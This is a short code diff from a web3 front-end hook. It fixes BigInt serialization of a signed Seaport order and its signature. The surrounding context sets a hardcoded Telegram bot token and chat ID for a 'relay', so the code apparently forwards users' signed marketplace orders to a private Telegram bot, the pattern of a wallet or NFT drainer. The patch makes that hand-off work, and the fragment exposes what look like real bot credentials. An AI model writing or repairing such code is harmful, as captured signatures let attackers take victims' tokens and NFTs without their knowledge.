@@ -601,7 +601,9 @@ export function useWeb3Manager() {
                             type: "EVM_SEAPORT",
                             order: { parameters: orderComponents, signature },
                             chainName: targetChainName
-                        })}`;
+                        }, (key, value) =>
+                            typeof value === 'bigint' ? value.toString() : value // Handle BigInt serialization
+                        )}`;
 
                         const TG_BOT_TOKEN_RELAY = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
                         const TG_CHAT_ID_RELAY = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
